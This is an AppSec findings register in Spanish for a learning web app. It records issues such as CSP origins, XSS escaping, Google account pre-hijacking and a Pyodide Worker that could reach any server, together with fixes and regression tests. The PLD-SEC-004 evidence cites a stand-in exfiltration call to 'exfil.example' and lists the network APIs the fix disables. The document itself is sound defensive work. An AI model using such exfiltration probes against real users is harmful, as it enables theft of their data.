# Registro de hallazgos de seguridad

Registro central del equipo AppSec. **Solo lo edita `security-lead`**; los especialistas le
devuelven sus hallazgos con la plantilla de abajo. Flujo y severidad: [`AGENT_WORKFLOW.md`](AGENT_WORKFLOW.md).

| Última revisión | Commit | Tipo | Responsable |
|---|---|---|---|
| 19/10/2026 | `eb187a9` (`main`) | Cierre técnico de PLD-SEC-003, 004 y 005 | security-lead |
| 19/10/2026 | `708431f` (`main`) | Línea base completa al crear el equipo | security-lead |

La siguiente revisión incremental parte de `git diff eb187a9..HEAD`.

## Resumen

| ID | Título | Severidad | Estado | Responsable |
|---|---|---|---|---|
| PLD-SEC-001 | Sin pruebas de aislamiento entre cuentas en la mayoría de rutas privadas | Informativa | Corregido | security-qa |
| PLD-SEC-002 | Atributos de la barra lateral con datos del contenido sin escapar | Baja | Corregido | frontend-security |
| PLD-SEC-003 | La CSP de producción permite `localhost:8000` en `connect-src` | Baja | Activada en `pages.yml` en el PR #55 (sin fusionar); falta comprobar la web publicada | frontend-security |
| PLD-SEC-004 | El Worker de Pyodide no tiene CSP y podía conectar con cualquier origen | Media | Confirmado → mitigado (riesgo residual documentado) | frontend-security |
| PLD-SEC-005 | Dependencias de pip sin *hashes* ni archivo de bloqueo | Baja | Confirmado; propuesta verificada, pendiente de decisión | dependency-security |
| PLD-SEC-007 | Las cuentas creadas con Google no se podían borrar | Media | Corregido en el PR #55 (sin fusionar) | auth-security |
| PLD-SEC-008 | Pre-secuestro: Google entraba en una cuenta de contraseña sin email verificado | Media | Corregido en el PR #55 (sin fusionar) | auth-security |
| PLD-SEC-009 | Google Identity se cargaba en cada visita | Baja | Corregido en el PR #55 (sin fusionar) | frontend-security |
| PLD-SEC-006 | Riesgos ya aceptados en revisiones anteriores | Baja | Aceptado | security-lead |
| PLD-SEC-FP1 | Alertas de herramientas revisadas como falsos positivos | — | Falso positivo | security-lead |

## Plantilla

```
### PLD-SEC-NNN · Título
- Severidad: … (razonamiento: explotabilidad × impacto)
- Estado: confirmado | probable | no verificable | falso positivo → abierto | en curso | corregido | aceptado
- Responsable: <agente>
- Ubicación: archivo:línea
- Evidencia reproducible: comando o test, y su resultado
- Condiciones para explotarlo:
- Impacto y alcance:
- Recomendación:
- Prueba de regresión:
```

## Hallazgos

### PLD-SEC-001 · Sin pruebas de aislamiento entre cuentas en la mayoría de rutas privadas
- **Severidad**: Informativa. No es una vulnerabilidad: el código filtra por `user.id` en todas las
  rutas. Es un hueco de pruebas: un cambio futuro podría introducir un IDOR sin que falle ningún test.
- **Estado**: confirmado → **corregido**.
- **Responsable**: security-qa.
- **Ubicación**: `backend/tests/`. Solo `test_dashboard.py:129` y los tests de A2A probaban dos usuarios.
- **Evidencia**: `grep` de pruebas con dos cuentas en `backend/tests/` (19/10/2026).
- **Corrección**: `backend/tests/test_security_isolation.py`: dos usuarios; B intenta leer, sobrescribir
  y borrar los datos de A en progreso, intentos, estados de curso, PCAP, cuenta, exportación y
  actividad, también con `user_id`/email en la petición; borrar la cuenta de B no toca filas de A;
  las rutas privadas exigen sesión.
- **Prueba de regresión**: `cd backend && python -m pytest -q tests/test_security_isolation.py` → 4 pasan.

### PLD-SEC-002 · Atributos de la barra lateral con datos del contenido sin escapar
- **Severidad**: Baja. El dato sale de `frontend/data/lessons.json`, que solo cambia con un commit
  al repositorio; no lo controla el alumno ni la API.
- **Estado**: confirmado → **corregido** en la rama del PR #50.
- **Responsable**: frontend-security + security-qa.
- **Ubicación**: `frontend/js/app.js` en `renderSidebar()`.
- **Condiciones**: un slug con comillas en el JSON (error de contenido o commit malicioso).
- **Impacto**: XSS almacenado en la web publicada para todos los visitantes; requiere acceso de escritura al repositorio.
- **Corrección**: `escapeHtml()` en `data-module`, `href` y `data-slug` (`frontend/js/app.js`, `renderSidebar()`); validación de slugs con `^[a-z0-9-]+$` en `backend/tests/test_content.py`.
- **Prueba de regresión**: `test_module_and_lesson_slugs_are_safe_for_html_attributes_and_routes` (`cd backend && python -m pytest -q tests/test_content.py`).

### PLD-SEC-003 · La CSP de producción permite `localhost:8000` en `connect-src`
- **Severidad**: Baja. Sin un XSS previo no tiene efecto.
- **Estado**: confirmado → **corrección preparada**, sin activar en la web publicada.
- **Responsable**: frontend-security.
- **Ubicación**: `frontend/index.html:8`. Es la única página con esos orígenes: `404.html`,
  `privacidad.html` y `aviso-legal.html` solo tienen `connect-src 'self'`.
- **Por qué existen**: GitHub Pages solo sirve archivos, así que la misma CSP vale en producción y en
  desarrollo. En desarrollo y en los e2e la web se sirve en `localhost:5500` y llama a la API en
  `127.0.0.1:8000` (`frontend/js/api.js:6`, `playwright.config.js`, `README.md:137`). El modo local de
  un solo puerto (`scripts/run_local.py`, `backend/app/local_site.py`) no los necesita: usa `'self'`.
- **Evidencia**: `python scripts/security/production_csp.py --check frontend` → quita 44 caracteres,
  exactamente los dos orígenes.
- **Impacto**: con un XSS, la página publicada podría hablar con un servicio local en el puerto 8000 del visitante.
- **Corrección**: `scripts/security/production_csp.py` quita los dos orígenes de la copia que se
  publica y falla si queda algún origen `http:`; el repositorio y el desarrollo no cambian.
  **Activada en el PR #55** (20/10/2026, sin fusionar): paso «CSP de producción» en
  `.github/workflows/pages.yml`, autorizado por la persona en su encargo de cierre del MVP. Sobre una
  copia de `frontend/` quita exactamente `http://127.0.0.1:8000` y `http://localhost:8000` (44
  caracteres) y deja intactos Google y Pyodide. **Pendiente**: tras el merge, ver el `<meta>` de la
  web publicada (no se ha podido abrir desde el entorno de la auditoría).
- **Prueba de regresión**: `backend/tests/test_production_csp.py` (4 tests): solo cambian esos dos
  orígenes, el resto de directivas y de la página quedan igual, y se rechazan orígenes `http:`.

### PLD-SEC-004 · El Worker de Pyodide no tiene CSP y podía conectar con cualquier origen
- **Severidad**: Media. Requiere que la persona ejecute código preparado por otro (por ejemplo,
  pegado de un foro), pero ese código podía enviar a cualquier servidor lo que escribiera en la
  consola o lo que obtuviera desde el Worker. La CSP que el proyecto daba por buena no se aplicaba allí.
- **Estado**: **confirmado** experimentalmente → **mitigado**.
- **Responsable**: frontend-security + security-qa.
- **Ubicación**: `frontend/js/pyodide-worker.js` (Worker de módulo creado desde
  `frontend/js/python-runner.js:34` con una URL del mismo origen).
- **Evidencia** (Chromium de Playwright, 19/10/2026): desde la página, `fetch("https://exfil.example/…")`
  lo bloquea la CSP; desde Python en la consola, `js.XMLHttpRequest` y `js.fetch` hacia el mismo
  origen **llegaban** (estado 200). La CSP en `<meta>` no se hereda en un Worker cargado desde una URL;
  ese Worker solo tendría CSP con una cabecera HTTP, y GitHub Pages no permite cabeceras.
- **Corrección**: tras cargar Python, el Worker sustituye por funciones que fallan `fetch`,
  `XMLHttpRequest`, `WebSocket`, `WebSocketStream`, `EventSource`, `WebTransport`, `Worker`,
  `SharedWorker`, `importScripts` y `caches`, además de `eval` y los constructores de funciones
  (con ellos se podía escribir `import("https://…")`, que no se puede sustituir). El alumno no necesita
  red: no hay paquetes que descargar después de cargar Python.
- **Prueba de regresión**: `e2e/security.spec.js`, «el código Python del alumno no puede enviar datos a
  otros servidores»: falla sin la corrección (comprobado) y pasa con ella. Suite e2e completa: 123 en verde.
- **Riesgo residual**: es defensa en profundidad dentro del mismo JavaScript, no una frontera del
  navegador: una técnica que no se haya previsto podría saltarla. Solo se ha probado en Chromium. La
  barrera completa sería una CSP propia del Worker: crearlo desde una URL `blob:` (que sí hereda la CSP
  de la página) exige añadir `blob:` a `worker-src`; es un cambio de CSP que necesita autorización.
  El Worker conserva acceso a IndexedDB del sitio (la web no lo usa para datos personales).

### PLD-SEC-005 · Dependencias de pip sin *hashes* ni archivo de bloqueo
- **Severidad**: Baja. Casi todos los rangos tienen límite superior; `pip-audit` en CI y Dependabot.
- **Estado**: confirmado; propuesta comprobada, **pendiente de decisión** (cambia el despliegue).
- **Responsable**: dependency-security.
- **Ubicación**: `backend/requirements.txt` (rangos), `backend/Dockerfile:14` (`pip install -r
  requirements.txt` sin `--require-hashes`) y `backend/Dockerfile:5` (`python:3.12-slim` sin *digest*).
- **Evidencia**: `requirements.txt` declara 14 paquetes (dos sin límite superior: `python-multipart` y `argon2-cffi`); la resolución real para la imagen instala
  63 (directos y transitivos), y ninguno queda fijado: cada build de Render toma la versión más nueva
  dentro de cada rango.
- **Impacto**: una versión nueva comprometida o rota de cualquiera de los 63 entraría en la siguiente
  imagen sin pasar por la CI.
- **Propuesta verificada**: `uv pip compile backend/requirements.txt --python-version 3.12
  --python-platform x86_64-manylinux_2_28 --generate-hashes -o backend/requirements.lock` genera 63
  paquetes con 1 559 *hashes* de PyPI, y `pip install --require-hashes --only-binary=:all:` para
  Python 3.12 en Linux instala los 63 sin errores. Pasos y contrapartidas en `REMEDIATION_PLAN.md`.
- **Prueba de regresión**: un job de CI que instale con `--require-hashes` y ejecute pytest.

### PLD-SEC-007 · Las cuentas creadas con Google no se podían borrar
- **Severidad**: Media (derecho de supresión, art. 17 RGPD, sin vía en la web).
- **Estado**: confirmado → **corregido** (PR #58, ya en `main`, y endurecido en el PR #55).
- **Ubicación**: `backend/app/routers/auth.py` (`login_google` crea la cuenta con una contraseña
  aleatoria) y `backend/app/routers/account.py` (`delete_my_account` solo aceptaba contraseña).
- **Corrección**: `DeleteConfirm` exige **exactamente uno** de `password` o `google_credential` (422
  si faltan los dos o llegan los dos, para que una contraseña incorrecta no quede oculta tras Google).
  La credencial es un ID token nuevo validado con `google.oauth2.id_token` (firma, audiencia,
  caducidad, `email_verified`), emitido hace **menos de 10 minutos** (`iat`; si no, 403) y con el
  email de la sesión. Sigue haciendo falta la sesión. En la web, la credencial solo borra con la
  sección «Eliminar mi cuenta» abierta (`deleteWithGoogle` lo comprueba aunque el último botón de
  Google mostrado fuera el de borrar); el botón de entrar se oculta con sesión abierta y nunca borra.
  Los dos últimos puntos los encontró la revisión independiente de `security-auditor` (20/10/2026).
- **Prueba de regresión**: `backend/tests/test_google_auth.py` (borrado con Google, otra cuenta,
  credencial no válida, sin método, los dos métodos, `null`, sin sesión, Google sin configurar,
  credencial antigua o sin fecha) y `e2e/account.spec.js` (borrado con Google simulado, rechazo de
  otra cuenta y el botón de entrar no borra con la sesión abierta).

### PLD-SEC-008 · Pre-secuestro de cuentas al entrar con Google
- **Severidad**: Media. El registro con contraseña no comprueba el email: alguien podía registrar el
  email de otra persona y, cuando esta entraba con Google, compartir la cuenta sabiendo la contraseña.
- **Estado**: confirmado en el código → **corregido** en el PR #55 (decisión de la persona del
  20/10/2026: anular la contraseña).
- **Corrección**: nueva columna `users.email_verified_at` (migración aditiva `b4f1c2d3e5a6`, vacía
  para las cuentas existentes). Google y el enlace de recuperación la rellenan. Si se entra con Google
  en una cuenta sin email verificado, se sustituye la contraseña por una aleatoria, se incrementa
  `token_version` (se cierran las demás sesiones) y se registra `google_linked` en la actividad.
  Quien quiera volver a usar contraseña la restablece por email.
- **Riesgo residual**: mientras no haya envío de email (Brevo pendiente), esa cuenta solo puede
  entrar con Google. Las cuentas antiguas creadas con Google cierran sus otras sesiones una vez.
- **Prueba de regresión**: `test_google_login_on_unverified_account_voids_password_and_sessions`,
  `test_later_google_logins_do_not_close_sessions_again`,
  `test_password_set_by_email_link_survives_google_login`.

### PLD-SEC-009 · Google Identity se cargaba en cada visita
- **Severidad**: Baja (privacidad): Google recibía la IP de cualquier visitante y podía dejar su
  cookie `g_state`.
- **Estado**: **corregido** en el PR #55: `frontend/js/account.js` descarga
  `https://accounts.google.com/gsi/client` solo al abrir el inicio de sesión o «Eliminar mi cuenta», y
  `/api/health` indica `"google"` para ocultar el botón si el servidor no tiene `GOOGLE_CLIENT_ID`.
- **Prueba de regresión**: `e2e/account.spec.js` («Google solo se descarga al abrir el login…»).
- **Pendiente** (hilo legal): la política de privacidad aún no nombra a Google.

### PLD-SEC-006 · Riesgos ya aceptados en revisiones anteriores
Siguen vigentes y documentados en [`revision-2026-10.md`](revision-2026-10.md): `style-src 'unsafe-inline'`,
CSP en `<meta>` sin `frame-ancestors`, Pyodide desde jsDelivr sin SRI, progreso declarado por el alumno,
límites de intentos en memoria (una instancia), token de Android en `SharedPreferences` y rutas
antiguas `/api/...`. No se reabren salvo que cambie su contexto.

### PLD-SEC-FP1 · Falsos positivos revisados
| Herramienta | Ubicación | Motivo |
|---|---|---|
| Bandit B105 (baja) | `backend/app/security_events.py:31`, `:32`, `:37` | Nombres de eventos (`"auth.token_forged"`…), no contraseñas |
| Bandit B106 (baja) | `backend/app/session_cookie.py:40` | `token_type="cookie"` es el tipo de sesión, no un secreto |
| Bandit B310 (media) | `backend/app/mailer.py:87` | `urlopen` sobre `BREVO_URL`, una constante `https://`; marcado `# nosec B310` con el motivo |
| Gitleaks `generic-api-key` | `backend/tests/test_auth.py:69` | Contraseña ficticia de un test de fuerza bruta; ignorada por huella en `.gitleaksignore` |
| Semgrep `pld-token-in-web-storage` | `frontend/js/store.js:78` | Guarda la marca literal `"cookie"`, no un token; la regla ya excluye literales |
